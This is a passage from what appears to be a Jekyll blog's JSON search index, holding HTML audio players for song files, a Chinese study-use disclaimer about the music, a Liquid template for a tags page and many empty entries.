Greatest.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  Immortals: <audio src=\"/music/Immortals.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  See You Again: <audio src=\"/music/See You Again.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  Dream It Possible: <audio src=\"/music/Dream It Possible.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  Try Everything: <audio src=\"/music/Try Everything.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  We Are Young: <audio src=\"/music/We Are Young.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio></p>\n  </li>\n  <li>\n    <p><strong>Guardians of the Galaxy原声精选:</strong><br />\n  Mr. Blue Sky: <audio src=\"/music/Guardians of the Galaxy/Mr. Blue Sky.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  The Chain: <audio src=\"/music/Guardians of the Galaxy/The Chain.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  My Sweet Lord: <audio src=\"/music/Guardians of the Galaxy/My Sweet Lord.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio></p>\n  </li>\n  <li>\n    <p><strong>纯音乐：</strong><br />\n  A First Star: <audio src=\"/music/A First Star.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n<br />\n<strong>上述所有资源及音乐均仅供学习交流,不得传播,如有侵权，请告知LEXUGE后删除</strong></p>\n  </li>\n</ul>\n\n<p><br /></p>\n"
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
        "title"    : "Tags",
        "category" : "",
        "tags"     : "",
        "url"      : "/tags/",
        "date"     : "",
        "content"  : "{% capture tags %}\n  {% for tag in site.tags %}\n    {{ tag[0] }}\n  {% endfor %}\n{% endcapture %}\n{% assign sortedtags = tags | split:' ' | sort %}\n\n{% for tag in sortedtags %}\n  <h3 id=\"{{ tag | url_encode}}\">{{ tag }}</h3>\n  <ul>\n  {% for post in site.tags[tag] %}\n    <li>{{ post.date |date:\"%B %d, %Y\"}} <a href=\"{{ post.url }}\">{{ post.title }}</a></li>\n  {% endfor %}\n  </ul>\n{% endfor %}\n"
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
   } 
  
]
